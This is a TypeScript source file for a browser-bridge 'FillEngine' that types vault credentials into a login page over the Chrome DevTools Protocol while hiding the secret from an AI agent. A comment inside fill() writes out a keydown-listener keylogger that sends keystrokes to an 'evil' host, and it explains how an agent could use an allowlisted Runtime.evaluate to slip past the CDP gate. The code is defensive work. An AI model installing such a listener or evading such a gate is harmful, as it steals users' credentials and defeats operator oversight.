// Copyright (C) 2026 1Claw
// SPDX-License-Identifier: Apache-2.0

import type { Grant } from "@1claw/browser-bridge-protocol";
import type { CdpGate } from "./cdp-policy.js";
import type { CdpMessage, CdpTransport } from "./cdp-transport.js";
import type { SecretHandle } from "./secret-handle.js";
import type { VaultBackend } from "./vault-backend.js";

/**
 * Types a credential into a page.
 *
 * This is where every other control in the bridge is actually cashed in, so the
 * ordering is the design:
 *
 *   1. **Open the fill window first.** Before the secret exists in this
 *      process, the agent's CDP access to the target is already blocked. Doing
 *      it the other way round leaves a gap in which the agent can watch the
 *      typing it is about to be blocked from watching.
 *   2. **Navigate to the binding's own `login_url`.** Never the page the agent
 *      happens to be on — an agent that picks the URL picks who receives the
 *      password.
 *   3. **Re-check the generation immediately before typing.** Authorisation
 *      happened at some earlier instant; if the page navigated since, the
 *      credential would land in whatever loaded instead. This is the TOCTOU
 *      gap and it is closed at the last possible moment rather than the first.
 *   4. **Type from the handle, then dispose.** The secret is borrowed for the
 *      duration of the keystrokes and zeroed straight after.
 *   5. **Close the window in `finally`.** A fill that throws must not leave the
 *      agent permanently locked out of its own browser — the failure path is
 *      where a half-open window would otherwise persist.
 */

export type FillOutcome =
  | { readonly status: "filled" }
  | { readonly status: "aborted"; readonly reason: "generation_stale" | "navigated" }
  | { readonly status: "error"; readonly message: string };

export type FillEngineDeps = {
  readonly backend: VaultBackend;
  readonly transport: CdpTransport;
  readonly gate: CdpGate;
  /** Reads the target's current generation. Bumped by navigation. */
  readonly currentGeneration: (targetId: string) => number;
  /**
   * The browser context the agent's target lives in.
   *
   * The fill happens in a throwaway target created *in that same context*, so
   * the session cookie lands where the agent will use it — cookies belong to the
   * context, not the target. Without this the credential would authenticate a
   * context the agent never sees.
   */
  readonly browserContextOf?: (targetId: string) => string | undefined;
  /**
   * Where the real failure goes.
   *
   * Separate from the return value on purpose: the operator needs the detail
   * and the agent must not have it, so they cannot be the same string.
   */
  readonly onError?: (error: unknown) => void;
};

export class FillEngine {
  readonly #deps: FillEngineDeps;

  constructor(deps: FillEngineDeps) {
    this.#deps = deps;
  }

  /**
   * Perform one fill against `targetId`, using `grant`.
   *
   * Returns a status. It never returns, logs, or embeds the credential — the
   * caller is an MCP tool result, and the invariant is that a secret never
   * reaches the agent.
   */
  async fill(targetId: string, grant: Grant, selector: string): Promise<FillOutcome> {
    const { backend, transport, gate, currentGeneration } = this.#deps;

    // 1. Block the agent before the secret exists anywhere in this process.
    gate.openFillWindow(targetId);

    let handle: SecretHandle | undefined;
    let fillTarget: string | undefined;
    try {
      // 2. Type into a target the agent has never had a session on.
      //
      // Blocking CDP during the window is not enough on its own. Runtime.evaluate
      // is allowlisted *outside* a window, so an agent can install
      //
      //     addEventListener('keydown', e => fetch('https://evil/?k=' + e.key), true)
      //
      // beforehand and read the credential as it is typed, without issuing a
      // single CDP command while the window is open. The module doc for the
      // policy names this exact bypass; the allowlist twelve lines below made it
      // reachable. MutationObservers and beforeinput handlers are the same shape.
      //
      // A page the agent has never scripted has no listeners to fire. The cookie
      // still lands in the shared browser context, so the agent's own page is
      // authenticated afterwards — which is the whole point of the fill.
      const contextId = this.#deps.browserContextOf?.(targetId);
      fillTarget = await this.#createTarget(contextId);

      // 3. Window it too, immediately. Target.getTargets and
      //    Target.attachToTarget are both allowlisted, so an agent that notices
      //    the new target must still be refused on it.
      gate.openFillWindow(fillTarget);

      const sessionId = await this.#attach(fillTarget);

      // 4. The binding's URL, not the agent's.
      await this.#send({ sessionId, method: "Page.navigate", params: { url: grant.loginUrl } });

      // 5. Navigation bumps the generation, so this catches both a page that
      //    moved on its own and one the agent moved underneath us.
      if (currentGeneration(targetId) !== grant.generation) {
        return { status: "aborted", reason: "generation_stale" };
      }

      handle = await backend.consumeFill(grant);

      // Focus first: typing into whatever happens to hold focus is how a
      // password ends up in a search box, or in the page's chat widget.
      await this.#send({ sessionId, method: "DOM.querySelector", params: { selector } });

      // Re-check after every await that could have yielded to a navigation.
      if (currentGeneration(targetId) !== grant.generation) {
        return { status: "aborted", reason: "navigated" };
      }

      // 6. Borrow, type, and let `use` zero the buffer even if this throws.
      const text = handle.use((bytes) => new TextDecoder().decode(bytes));
      await this.#send({ sessionId, method: "Input.insertText", params: { text } });

      return { status: "filled" };
    } catch (e) {
      // Deliberately not `e.message`. This return value is handed to the agent,
      // and the thrown text comes from the backend and the transport — a driver
      // that interpolates a response body, or a vault error naming what it was
      // reading, would put that text in front of the caller this package exists
      // to keep it away from. The detail goes to the operator instead.
      this.#deps.onError?.(e);
      return { status: "error", message: "the fill did not complete" };
    } finally {
      // A handle that was consumed but never typed — because the generation
      // moved, or the transport threw — is still live until this runs.
      handle?.dispose();
      // The throwaway target goes away with the secret it was created for.
      if (fillTarget !== undefined) {
        try {
          await this.#send({ method: "Target.closeTarget", params: { targetId: fillTarget } });
        } catch {
          // Losing the close is untidy, not unsafe; the window below still shuts.
        }
        gate.closeFillWindow(fillTarget);
      }
      // 7. Always. A stuck window locks the agent out of its own browser.
      gate.closeFillWindow(targetId);
    }
  }

  /** Create the throwaway target the credential is typed into. */
  async #createTarget(browserContextId: string | undefined): Promise<string> {
    const reply = await this.#send({
      method: "Target.createTarget",
      params: {
        url: "about:blank",
        ...(browserContextId !== undefined ? { browserContextId } : {}),
      },
    });
    const result = reply.result as { targetId?: unknown } | undefined;
    if (typeof result?.targetId !== "string") {
      throw new Error("Target.createTarget returned no targetId");
    }
    return result.targetId;
  }

  /**
   * Attach to the target and return the session to address it by.
   *
   * Goes straight to the transport: the gate exists to judge the agent, and the
   * bridge is the thing holding the fill window open.
   */
  async #attach(targetId: string): Promise<string> {
    const reply = await this.#send({
      method: "Target.attachToTarget",
      params: { targetId, flatten: true },
    });
    const result = reply.result as { sessionId?: unknown } | undefined;
    if (typeof result?.sessionId !== "string") {
      throw new Error("Target.attachToTarget returned no sessionId");
    }
    return result.sessionId;
  }

  /** Bridge-originated commands bypass the gate: the gate is for the agent. */
  async #send(msg: CdpMessage): Promise<CdpMessage> {
    return this.#deps.transport.send(msg);
  }
}
